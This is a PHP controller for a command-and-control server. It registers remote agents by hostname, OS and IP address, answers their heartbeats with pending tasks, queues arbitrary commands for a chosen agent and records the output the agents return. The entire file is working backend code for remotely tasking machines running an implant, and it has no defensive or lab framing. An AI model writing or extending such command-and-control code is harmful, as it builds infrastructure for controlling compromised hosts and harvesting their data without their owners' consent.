<?php
namespace App\Controllers;

use App\Core\Request;
use App\Models\Agent;
use App\Models\Task;

class C2Controller extends Controller
{
    public function index()
    {
        $this->view('c2/index');
    }

    public function listAgents()
    {
        $agents = Agent::all();
        $this->json(['agents' => $agents]);
    }

    public function registerAgent(Request $request)
    {
        $data = $request->only(['agent_id', 'hostname', 'os', 'ip_address']);
        if (empty($data['agent_id'])) {
            $this->json(['error' => 'agent_id required'], 400);
        }
        $agent = Agent::register($data['agent_id'], $data['hostname'] ?? 'unknown', $data['os'] ?? 'unknown', $data['ip_address'] ?? $_SERVER['REMOTE_ADDR']);
        $this->json(['status' => 'registered', 'agent' => $agent]);
    }

    public function heartbeat(Request $request)
    {
        $agentId = $request->input('agent_id');
        if (!$agentId) $this->json(['error' => 'agent_id required'], 400);
        Agent::heartbeat($agentId);
        // Return pending tasks
        $agent = Agent::where('agent_id', $agentId);
        if ($agent) {
            $tasks = Task::getPendingForAgent($agent[0]['id']);
            $this->json(['status' => 'ok', 'tasks' => $tasks]);
        } else {
            $this->json(['error' => 'Agent not found'], 404);
        }
    }

    public function sendCommand(Request $request)
    {
        $agentId = $request->input('agent_id');
        $command = $request->input('command');
        if (!$agentId || !$command) {
            $this->json(['error' => 'agent_id and command required'], 400);
        }
        $agent = Agent::where('agent_id', $agentId);
        if (!$agent) {
            $this->json(['error' => 'Agent not found'], 404);
        }
        $taskId = Task::queueCommand($agent[0]['id'], $command);
        $this->json(['status' => 'queued', 'task_id' => $taskId]);
    }

    public function taskResult(Request $request)
    {
        $taskId = $request->input('task_id');
        $output = $request->input('output');
        if (!$taskId) $this->json(['error' => 'task_id required'], 400);
        $task = Task::find($taskId);
        if ($task) {
            Task::update($taskId, ['status' => 'completed', 'output' => $output, 'executed_at' => date('Y-m-d H:i:s')]);
            $this->json(['status' => 'updated']);
        } else {
            $this->json(['error' => 'Task not found'], 404);
        }
    }
}
